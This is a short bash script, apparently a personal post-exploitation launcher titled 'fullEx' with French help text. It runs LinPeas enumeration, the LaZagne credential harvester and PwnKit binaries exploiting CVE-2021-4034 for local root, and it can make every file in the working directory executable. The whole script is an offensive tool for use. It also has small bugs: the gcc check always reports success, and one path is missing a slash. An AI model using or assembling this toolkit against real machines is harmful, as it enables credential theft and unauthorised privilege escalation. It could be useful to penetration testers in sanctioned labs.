#!/bin/bash

ascii() {
    cat <<"EOF"

                                                    
__________      ____________________       
___  ____/___  ____  /__  /__  ____/___  __
__  /_   _  / / /_  /__  /__  __/  __  |/_/
_  __/   / /_/ /_  / _  / _  /___  __>  <  
/_/      \__,_/ /_/  /_/  /_____/  /_/|_|  
                                                                                                   
by M0rPH3U53

      
EOF
}                                   

if [[ "$*" == "-help" ]]; then
    ascii
    echo "Usage: ./fullEx.sh COMMAND"
    echo " "
    echo "Commands:"
    echo "   -LinPeas       Execute LinPeas"
    echo "   -LaZagne       Execute LaZagne"
    echo "   -PwnKit64/32   PwnKit64/32 - CVE-2021-4034"
    echo "   -check         Verifie si gcc est installer"
    echo "   -perm          Applique les droit d'execution"
    echo " "
    exit 0
fi

# Application des droit d'execution
if [[ "$*" == "-perm" ]]; then
   find ${PWD} -type f -exec chmod +x {} \;
fi

# Verifie si GCC est installer
if [[ "$*" == "-check" ]]; then
   which gcc > /dev/null 2>&1
   echo "[+] GCC found !"
fi

# LinPeas
if [[ "$*" == "-LinPeas" ]]; then
   "${PWD}linpeas/linpeas.sh"
fi

# LaZagne
if [[ "$*" == "-LaZagne" ]]; then
  "${PWD}/LaZagne/Linux/laZagne.py"
fi

# PwnKit
for arch in 64 32; do
     if [[ "$*" == "-PwnKit${arch}" ]]; then
          "${PWD}/exploits/PwnKit/PwnKit${arch}"
     fi
done
